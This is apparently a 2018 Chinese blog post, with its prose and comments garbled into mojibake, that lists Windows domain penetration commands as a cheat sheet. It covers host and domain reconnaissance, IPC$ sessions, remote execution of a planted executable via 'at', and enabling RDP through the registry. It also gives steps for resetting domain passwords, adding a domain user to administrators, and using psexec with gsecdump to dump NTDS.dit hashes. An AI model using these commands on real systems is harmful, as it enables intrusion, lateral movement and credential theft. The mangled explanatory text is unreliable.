---
title: åŸŸæ¸—é€å‘½ä»¤å°ç»“
comments: false
date: 2018-06-05 11:44:41
tags: 
- åŸŸæ¸—é€
- åŸºç¡€å‘½ä»¤
categories: 
- å†…ç½‘å®‰å…¨
typora-root-url: {{ title }}
typora-copy-images-to: {{ title }}
password: wohaimeixiewan
---

<blockquote class="blockquote-center">é»‘å¤œæ— è®ºæ€æ ·æ‚ é•¿,<br>ç™½æ˜¼æ€»ä¼šåˆ°æ¥</blockquote>

&emsp;&emsp;Bolgåœ¨15å¹´å°±æœ‰è¿™ä¸ªæ‰“ç®—ï¼Œä½†æ˜¯æ‹–å»¶ç—‡çœŸçš„å¯æ€•ğŸ˜¨ï¼ŒæŠŠä»¥å‰å·¥ä½œä¸­çš„çŸ¥è¯†æ±‡æ€»ä¸€ä¸‹ï¼Œæœ‰æ—¶å€™å…‰çŸ¥é“ï¼Œä½†å°±æ˜¯è¯´ä¸å‡ºæ¥ï¼Œä¸€å¥è¯è¿˜æ˜¯ä¸ç†Ÿç»ƒï¼Œæ‰€ä»¥è®°å½•ä¸‹æ¥å§ã€‚

### æœ¬åœ°åŸºç¡€ä¿¡æ¯å‘½ä»¤

```
ipconfig/all    
# æŸ¥çœ‹IPåœ°å€
ipconfig /release
ipconfig /renew 
# é‡Šæ”¾åœ°å€ or é‡æ–°è·å–
whoami /all  
# æŸ¥çœ‹sidå€¼
systeminfo
# æŸ¥è¯¢ç³»ç»Ÿä»¥åŠè¡¥ä¸ä¿¡æ¯
tasklist /svc
wmic process list brief
# æŸ¥çœ‹è¿›ç¨‹
tasklist /svc |findstr TermService 
netstat -ano |findstr `TermService pid`
# æŸ¥çœ‹æŸä¸ªè¿›ç¨‹ç½‘ç»œä½¿ç”¨
taskkill /im è¿›ç¨‹åç§°
ntsd -c q -p
taskkill /pid[è¿›ç¨‹ç ] -t(ç»“æŸè¯¥è¿›ç¨‹) -f(å¼ºåˆ¶ç»“æŸè¯¥è¿›ç¨‹ä»¥åŠæ‰€æœ‰å­è¿›ç¨‹)
wmic process [handle/PID] delete
wmic process where "name='svchost.exe' and ExecutablePath<>'C:\\WINDOWS\\system32\\svchost.exe'" call Terminateï¼ˆç»“æŸsvchost.exeè¿›ç¨‹,è·¯å¾„ä¸ºC:\WINDOWS\svchost.exeçš„(å…³é”®ç‚¹ï¼šè·¯å¾„ä¸­çš„\ä¸€å®šè¦æ¢æˆ\\ï¼‰
# ç»“æŸè¿›ç¨‹
wmic process call create notepad
# æ–°å»ºnotepadè¿›ç¨‹
wmic qfe  get hotfixid    
# æŸ¥çœ‹å·²å®‰è£…è¿‡å¾—è¡¥ä¸ï¼Œè¿™ä¸ªå¾ˆå®ç”¨
wmic qfe list full /format:htable > hotfixes.htm  
# è¯¦ç»†çš„è¡¥ä¸å®‰è£…
wmic  qfe      
# æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯ä»¥åŠå¾®è½¯æä¾›çš„ä¸‹è½½åœ°å€
wmic process where pid="123" delete
# wmic åˆ é™¤æŒ‡å®šè¿›ç¨‹(æ ¹æ®è¿›ç¨‹PID)
ping hostname(ä¸»æœºåï¼‰   
# æ˜¾ç¤ºè¯¥æœºå™¨åçš„IP
net start   
# æŸ¥çœ‹å½“å‰è¿è¡Œçš„æœåŠ¡
net user      
# æŸ¥çœ‹æœ¬åœ°ç»„çš„ç”¨æˆ·
net localhroup administrators   
# æŸ¥çœ‹æœ¬æœºç®¡ç†å‘˜ç»„æœ‰å“ªäº›ç”¨æˆ·
net use      
# æŸ¥çœ‹ä¼šè¯
net session     
# æŸ¥çœ‹å½“å‰ä¼šè¯
net share    
WMIC share list brief
# æŸ¥çœ‹SMBæŒ‡å‘çš„è·¯å¾„[å³å…±äº«]
wmic share get name,path   
# æŸ¥çœ‹SMBæŒ‡å‘çš„è·¯å¾„
wmic nteventlog get path,filename,writeable 
# æŸ¥è¯¢ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶å­˜å‚¨ä½ç½®
net use \\IP\ipc$  password  /user:username      
# å»ºç«‹IPCä¼šè¯ï¼ˆå·¥ä½œç»„æ¨¡å¼ï¼‰
net use  z:  \\192.168.1.1      
# å»ºç«‹æ˜ å°„åˆ°æœ¬æœºZç›˜
net time \\172.16.16.2        
# æŸ¥è¯¢å…±äº«ä¸»æœºçš„æ˜¯
at \\172.16.16.2 13:50 c:\windows\2009.exe      
# åœ¨å…±äº«ä¸»æœºä¸Šæ‰§è¡Œ
netstat  -ano      
# æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£
netstat -an | find â€œ3389â€   
# æ‰¾åˆ°3389ç«¯å£
net accounts      
# æŸ¥çœ‹æœ¬åœ°å¯†ç ç­–ç•¥
nbtstat â€“A ip      
# netbisoæŸ¥è¯¢
net view      
# æŸ¥çœ‹æœºå™¨æ³¨é‡Šæˆ–è®¸èƒ½å¾—åˆ°å½“å‰æ´»åŠ¨çŠ¶æ€çš„æœºå™¨åˆ—è¡¨ï¼Œå¦‚æœç¦ç”¨netbioså°±æŸ¥çœ‹ä¸å‡ºæ¥
echo %PROCESSOR_ARCHITECTURE%        
# æŸ¥çœ‹ç³»ç»Ÿæ˜¯32è¿˜æ˜¯64ä½  
set                              
# æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒè®¾ç½®å˜é‡
net start                     
# æŸ¥çœ‹å½“å‰è¿è¡Œçš„æœåŠ¡
wmic process get caption,handle,commandline,executablepath
# æŸ¥çœ‹è¿›ç¨‹è¯¦æƒ…ç­‰ç­‰
wmic service list brief             
# æŸ¥çœ‹è¿›ç¨‹æœåŠ¡
wmic startup list brief       
# æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯
wmic product list brief           
# æŸ¥çœ‹å®‰è£…ç¨‹åºå’Œç‰ˆæœ¬ä¿¡æ¯ï¼ˆæ¼æ´åˆ©ç”¨çº¿ç´¢ï¼‰
wmic startup list full         
# è¯†åˆ«å¼€æœºå¯åŠ¨çš„ç¨‹åº
wmic process where(description="mysqld.exe") >>mysql.log  
# è·å–è½¯ä»¶å®‰è£…è·¯å¾„
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
# å¼€å¯3389
for /r "path" %i in (*test*) do @echo %i
dir "path" /s /b /d | find "test"
wmic datafile where "drive='e:' and path='\\test\\' and FileName='cc' and Extension='cmd'" list
# æŸ¥æ‰¾æ–‡ä»¶
grep ä¸ findstræœ‰ç‚¹ç±»ä¼¼
```



### è·å–åŸŸå†…ä¿¡æ¯å‘½ä»¤

```
dsquery ou
è¯¥åŸŸç»„ç»‡å•ä½
net group /domain 
dsquery group                      
è·å¾—æ‰€æœ‰åŸŸç”¨æˆ·ç»„åˆ—è¡¨
net group qq_group /domain              
æ˜¾ç¤ºåŸŸä¸­qq_groupç»„çš„æˆå‘˜
net group qq_group /del /domain         
åˆ é™¤åŸŸä¸­qq_groupç»„
net group qq_group qq /del /domain      
åˆ é™¤åŸŸå†…qq_group ç¾¤ç»„ä¸­çš„æˆå‘˜QQ
net group qq_group /add /domain         
å¢åŠ åŸŸä¸­çš„ç¾¤ç»„
net group "domain admins" /domain       
è·å¾—åŸŸç®¡ç†å‘˜åˆ—è¡¨
net group "enterprise admins" /domain    
è·å¾—ä¼ä¸šç®¡ç†å‘˜åˆ—è¡¨
net localgroup administrators /domain   
è·å–åŸŸå†…ç½®administratorsç»„ç”¨ï¼ˆenterprise adminsã€domain adminsï¼‰
net group "domain controllers" /domain   
è·å¾—åŸŸæ§åˆ¶å™¨åˆ—è¡¨
net group "domain computers" /domain   
dsquery computer domainroot -limit 65535 
è·å¾—æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨
net user /domain     
dsquery user domainroot -limit 65535                  
è·å¾—æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨
net user someuser /domain              
è·å¾—æŒ‡å®šè´¦æˆ·someuserçš„è¯¦ç»†ä¿¡æ¯
net accounts /domain               
è·å¾—åŸŸå¯†ç ç­–ç•¥è®¾ç½®ï¼Œå¯†ç é•¿çŸ­ï¼Œé”™è¯¯é”å®šç­‰ä¿¡æ¯
nei view /domain                  
æŸ¥è¯¢æœ‰å‡ ä¸ªåŸŸ, æŸ¥è¯¢åŸŸåˆ—è¡¨
net view /domain:testdomain       
æŸ¥çœ‹ testdomainåŸŸä¸­çš„è®¡ç®—æœºåˆ—è¡¨
nltest /domain_trusts             
è·å–åŸŸä¿¡ä»»ä¿¡æ¯
net user domain-admin /domain     
æŸ¥çœ‹ç®¡ç†å‘˜ç™»é™†æ—¶é—´ï¼Œå¯†ç è¿‡æœŸæ—¶é—´ï¼Œæ˜¯å¦æœ‰ç™»é™†è„šæœ¬ï¼Œç»„åˆ†é…ç­‰ä¿¡æ¯
net config Workstation         
æŸ¥è¯¢æœºå™¨å±äºå“ªä¸ªåŸŸ
net time /domian               
æŸ¥è¯¢ä¸»åŸŸæœåŠ¡å™¨çš„æ—¶é—´
echo %logonserver%              
æŸ¥çœ‹ç™»é™†åˆ°è¿™å°æœåŠ¡å™¨çš„è®¡ç®—æœºå
net time  \\192.168.1.1         
æŸ¥è¯¢è¿œç¨‹å…±äº«ä¸»æœº192.168.1.1çš„æ—¶é—´
net use \\IP\ipc$ password /user:username@domain     
ipc$åŸŸå†…è¿æ¥
net  view  \\dc2.backlion.com         
æŸ¥çœ‹åŸŸæ§å…±äº«æƒ…å†µ
dir \\dc2.backlion.com\SYSVOL /s /a > sysvol.txt  
åˆ—å‡ºsysvolæ—¥å¿—è®°å½•
xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c
è¿œç¨‹æ‹·è´åˆ°æœ¬åœ°sysvolæ—¥å¿—
net user  /domain  bk bk123                 
ä¿®æ”¹åŸŸå†…ç”¨æˆ·å¯†ç ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™
net  localgroup  administartors   SEZKL\backlion  /add     
å°†SEZKLåŸŸä¸­çš„ç”¨æˆ·backlionæ·»åŠ åˆ°administratorsç»„ä¸­
mstsc /admin                 
è¿œç¨‹æ¡Œé¢ç™»å½•åˆ°consoleä¼šè¯è§£å†³hashæ— æ³•æŠ“å‡ºé—®é¢˜
gpupdate/force                  
æ›´æ–°åŸŸç­–ç•¥
psexec  \\192.168.1.3  -u administrator  -p  bk1234 -c  gsecdump.exe  -u
ä»åŸŸæœåŠ¡å™¨å¯†ç å­˜å‚¨æ–‡ä»¶windows/ntds/ntds.ditå¯¼å‡ºhashå€¼å‡ºæ¥
gsecdump  -a        
è·å–åŸŸç™»ç®¡ç†å‘˜ç™»å½•è¿‡å¾—hashå€¼ï¼Œè¿™é‡Œgescdumpä¸ºç¬¬ä¸‰æ–¹å¯¼å‡ºADåŸŸçš„hashå€¼
tasklist /S ip /U domain\username /P /V    
æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºè¿›ç¨‹åˆ—
```



